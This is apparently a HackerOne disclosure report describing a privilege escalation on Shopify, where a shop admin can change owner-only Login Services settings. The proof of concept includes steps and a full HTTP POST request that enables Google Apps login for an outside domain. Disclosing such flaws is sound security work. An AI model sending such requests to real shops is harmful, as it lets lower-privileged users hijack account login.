# HackerOne Report: Shop admin can change external login services
**Report ID:** 56626
**Vulnerability Class:** Privilege Escalation

## Vulnerability Information & PoC
 'Login services' section in the Settings->Account is accessible only to the Account owners. However, shop admins (full access users) can escalate privileges and modify the login services.

To verify,
1. Log into https://seclearn.myshopify.com as admin.
2. Navigate to settings->Account, notice that it does not show Login Services section to this user. However, he can modify the Login Services by sending the below request (use proper authenticity_token and cookies before sending the request).

	POST /admin/login_services/google_apps/update HTTP/1.1
	Host: seclearn.myshopify.com
	User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
	Cookie: ...
	Content-Type: application/x-www-form-urlencoded
	
	utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save


3. To confirm, log in as Account owner and look at the Login Services section. Notice that, Google apps are enabled and securitylearn.net is added to the google app domain.

## Discussion & Remediation Timeline
